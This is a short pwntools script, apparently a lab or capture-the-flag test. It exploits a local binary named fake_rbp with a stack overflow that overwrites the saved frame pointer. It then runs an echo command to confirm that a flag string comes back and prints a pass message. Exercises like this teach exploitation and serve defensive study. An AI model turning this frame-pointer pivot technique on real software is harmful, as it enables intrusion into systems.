#!/usr/bin/env python3
from pwn import context, p64, process

BUF = 0x7FFFFFFFEAF0
VULN = 0x401156
EXPECTED = b"KSJ{FAKE_RBP_VERIFIED}"

context.log_level = "error"

tube = process("./fake_rbp", aslr=False, env={})
payload = p64(VULN)
payload += b"A" * (512 - len(payload))
payload += p64(BUF - 8)

tube.sendafter(b"Send payload:\n", payload)
tube.sendline(b"echo " + EXPECTED + b"; exit")
output = tube.recvall(timeout=2)
assert b"returned through original RIP" in output, output
assert EXPECTED in output, output
print(
    f"[PASS] fake RBP: [buf]={VULN:#x}, saved RBP={BUF - 8:#x}, "
    f"payload={len(payload)} bytes"
)
